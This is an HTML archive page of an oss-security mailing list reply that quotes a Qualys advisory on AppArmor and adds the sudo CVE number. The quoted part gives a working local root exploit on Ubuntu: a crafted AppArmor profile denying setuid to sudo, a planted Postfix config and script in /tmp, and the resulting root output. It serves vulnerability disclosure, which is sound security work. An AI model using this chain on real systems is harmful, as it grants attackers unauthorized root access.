@@ -1,0 +1,304 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: Re: Multiple vulnerabilities in AppArmor</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="4">[&lt;prev]</a> <a href="6">[next&gt;]</a> <a href="../../../2026/04/01/3">[&lt;thread-prev]</a> <a href="../../../2026/05/20/16">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;ac-Ce5ILVDBNlwy5&#64;eldamar.lan&gt;
+Date: Fri, 3 Apr 2026 11:03:55 +0200
+From: Salvatore Bonaccorso &lt;carnil&#64;...ian.org&gt;
+To: oss-security&#64;...ts.openwall.com
+Cc: John Johansen &lt;john.johansen&#64;...onical.com&gt;
+Subject: Re: Re: Multiple vulnerabilities in AppArmor
+
+Hi,
+
+On Thu, Mar 12, 2026 at 09:33:57PM +0000, Qualys Security Advisory wrote:
+[...]
+&gt; AppArmor + Sudo + Postfix = root
+[...]
+&gt; ========================================================================
+&gt; AppArmor + Sudo + Postfix = root
+&gt; ========================================================================
+&gt; 
+&gt;     Did you get your disconnection notice?
+&gt;     Mine came in the mail today
+&gt;         -- Sonic Youth, "Disconnection Notice"
+&gt; 
+&gt; As an unprivileged local attacker, the ability to load, replace, and
+&gt; remove arbitrary AppArmor profiles is remarkable, but our crucial and
+&gt; burning question was: can this ability be transformed into an LPE to
+&gt; full root privileges? Our key idea was to load new AppArmor profiles
+&gt; that deny certain syscalls to certain privileged programs, and
+&gt; consequently to create exploitable "fail-open" situations.
+&gt; 
+&gt; From our work on Baron Samedit, we remembered that when Sudo encounters
+&gt; an unusual situation, it sends a mail to the system's administrator. And
+&gt; to send such a mail on Ubuntu, Sudo executes /usr/sbin/sendmail as our
+&gt; unprivileged user, not as root, with our original environment variables
+&gt; preserved (excluding the obviously dangerous variables such as LD_AUDIT
+&gt; and LD_PRELOAD, which were removed from the environment by the dynamic
+&gt; loader, ld.so, before the execution of Sudo's main() function).
+&gt; 
+&gt; From CVE-2002-0043:
+&gt; 
+&gt;   <a href="https://www.sudo.ws/security/advisories/postfix/" rel="nofollow">https://www.sudo.ws/security/advisories/postfix/</a>
+&gt;   (by Sebastian Krahmer)
+&gt; 
+&gt; we also remembered that if the Postfix mail server is installed on the
+&gt; system, and if Postfix's /usr/sbin/sendmail is executed as root but with
+&gt; user-controlled environment variables (in particular, the MAIL_CONFIG
+&gt; environment variable), then Postfix can be forced by the unprivileged
+&gt; user into executing arbitrary commands as root.
+&gt; 
+&gt; Our burning question therefore became: if we, as an unprivileged local
+&gt; attacker, load a new AppArmor profile that denies the setuid capability
+&gt; (CAP_SETUID) to Sudo (thereby potentially preventing Sudo from dropping
+&gt; its root privileges before it executes Postfix's /usr/sbin/sendmail),
+&gt; and if we execute Sudo with a MAIL_CONFIG environment variable that
+&gt; points to our own Postfix configuration in /tmp, is the /usr/bin/id
+&gt; command from our Postfix configuration executed as root? The answer:
+&gt; 
+&gt; ------------------------------------------------------------------------
+&gt; $ grep PRETTY_NAME= /etc/os-release
+&gt; PRETTY_NAME="Ubuntu 24.04.3 LTS"
+&gt; 
+&gt; $ id
+&gt; uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
+&gt; 
+&gt; $ dpkg -S /usr/sbin/sendmail
+&gt; postfix: /usr/sbin/sendmail
+&gt; 
+&gt; $ mkdir /tmp/postfix
+&gt; 
+&gt; $ cat &gt; /tmp/postfix/main.cf &lt;&lt; "EOF"
+&gt; command_directory = /tmp/postfix
+&gt; EOF
+&gt; 
+&gt; $ cat &gt; /tmp/postfix/postdrop &lt;&lt; "EOF"
+&gt; #!/bin/sh
+&gt; /usr/bin/id &gt;&gt; /tmp/postfix/pwned
+&gt; EOF
+&gt; 
+&gt; $ chmod -R 0755 /tmp/postfix
+&gt; 
+&gt; $ apparmor_parser -K -o sudo.pf &lt;&lt; "EOF"
+&gt; /usr/bin/sudo {
+&gt;   allow file,
+&gt;   allow signal,
+&gt;   allow network,
+&gt;   allow capability,
+&gt;   deny capability setuid,
+&gt; }
+&gt; EOF
+&gt; 
+&gt; $ su -P -c 'stty raw &amp;&amp; cat sudo.pf' "$USER" &gt; /sys/kernel/security/apparmor/.replace
+&gt; Password: 
+&gt; 
+&gt; $ env -i MAIL_CONFIG=/tmp/postfix /usr/bin/sudo whatever
+&gt; sudo: PERM_SUDOERS: setresuid(-1, 1, -1): Operation not permitted
+&gt; sudo: unable to open /etc/sudoers: Operation not permitted
+&gt; sudo: setresuid() [0, 0, 0] -&gt; [1001, -1, -1]: Operation not permitted
+&gt; sudo: error initializing audit plugin sudoers_audit
+&gt; 
+&gt; $ cat /tmp/postfix/pwned
+&gt; uid=0(root) gid=1001(jane) groups=1001(jane),100(users)
+&gt; ^^^^^^^^^^^
+&gt; ------------------------------------------------------------------------
+&gt; 
+&gt; The surprising sequence of events that led to this LPE as root is:
+&gt; 
+&gt; - in sudoers_init(), Sudo calls setresuid(0, -1, -1) to set its real uid
+&gt;   to 0 (PERM_ROOT), which succeeds because its effective and saved uids
+&gt;   are already 0 (Sudo is SUID-root);
+&gt; 
+&gt; - in open_sudoers() (more precisely, in open_file()), Sudo calls
+&gt;   setresuid(-1, 1, -1) to temporarily set its effective uid to 1
+&gt;   (PERM_SUDOERS), which fails (with EPERM, "Operation not permitted")
+&gt;   because none of Sudo's uids is 1 (they are all 0) and because Sudo
+&gt;   does not have the CAP_SETUID (our AppArmor profile denies it);
+&gt; 
+&gt; - back in sudoers_init(), Sudo calls mail_parse_errors() to send a mail
+&gt;   to the administrator about this setresuid() failure ("problem parsing
+&gt;   sudoers", "unable to open /etc/sudoers: Operation not permitted");
+&gt; 
+&gt; - then, in exec_mailer(), Sudo calls setuid(0) (at line 331 below) to
+&gt;   set all of its uids to 0, which succeeds because they are already 0;
+&gt; 
+&gt; - still in exec_mailer(), Sudo calls setuid(1001) (at line 336) to
+&gt;   permanently set all of its uids to our unprivileged user's uid, which
+&gt;   fails (with EPERM, "Operation not permitted") because none of Sudo's
+&gt;   uids is 1001 (they are all 0) and because Sudo does not have the
+&gt;   CAP_SETUID (our AppArmor profile denies it);
+&gt; 
+&gt; - finally, and despite this setuid() failure, Sudo's exec_mailer() calls
+&gt;   execv() (at line 345) to execute Postfix's /usr/sbin/sendmail with our
+&gt;   original environment variables (including our MAIL_CONFIG), as root
+&gt;   instead of our unprivileged user (because the setuid(1001) to drop
+&gt;   Sudo's root privileges failed).
+&gt; 
+&gt; ------------------------------------------------------------------------
+&gt;  284 exec_mailer(int pipein)
+&gt;  ...
+&gt;  327     /*
+&gt;  328      * Depending on the config, either run the mailer as root
+&gt;  329      * (so user cannot kill it) or as the user (for the paranoid).
+&gt;  330      */
+&gt;  331     if (setuid(ROOT_UID) != 0) {
+&gt;  332         sudo_debug_printf(SUDO_DEBUG_ERROR, "unable to change uid to %u",
+&gt;  333             ROOT_UID);
+&gt;  334     }
+&gt;  335     if (evl_conf-&gt;mailuid != ROOT_UID) {
+&gt;  336         if (setuid(evl_conf-&gt;mailuid) != 0) {
+&gt;  337             sudo_debug_printf(SUDO_DEBUG_ERROR, "unable to change uid to %u",
+&gt;  338                 (unsigned int)evl_conf-&gt;mailuid);
+&gt;  339         }
+&gt;  340     }
+&gt;  ...
+&gt;  342     if (evl_conf-&gt;mailuid == ROOT_UID)
+&gt;  343         execve(mpath, argv, (char **)root_envp);
+&gt;  344     else
+&gt;  345         execv(mpath, argv);
+&gt; ------------------------------------------------------------------------
+&gt; 
+&gt; Note: without the ability to load an AppArmor profile that denies the
+&gt; CAP_SETUID to Sudo, this "fail-open" situation in Sudo would not be
+&gt; exploitable, for the reasons explained in the "execve() and EAGAIN"
+&gt; section of "man execve".
+&gt; 
+&gt; Last-minute note: while writing a mail to Sudo's maintainer about this
+&gt; "fail-open" situation, we noticed that it was independently discovered,
+&gt; reported, and fixed in November 2025 (commit 3e474c2):
+&gt; 
+&gt; ------------------------------------------------------------------------
+&gt; exec_mailer: Set group as well as uid when running the mailer
+&gt; Also make a setuid(), setgid() or setgroups() failure fatal.
+&gt; Found by the ZeroPath AI Security Engineer &lt;<a href="https://zeropath.com" rel="nofollow">https://zeropath.com</a>&gt;
+&gt; ------------------------------------------------------------------------
+&gt; 
+&gt; Slightly disappointed by this user-space LPE (because Postfix is not
+&gt; installed by default on Ubuntu anymore), we decided to explore one more
+&gt; idea: maybe AppArmor's kernel code contains vulnerabilities that can be
+&gt; exploited in kernel space by loading, replacing, or removing arbitrary
+&gt; AppArmor profiles?
+
+To close the circle here: sudo has a own CVE for the issue addressed
+above, it is CVE-2026-35535.
+
+<a href="https://www.cve.org/CVERecord?id=CVE-2026-35535" rel="nofollow">https://www.cve.org/CVERecord?id=CVE-2026-35535</a>
+
+Regards,
+Salvatore
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
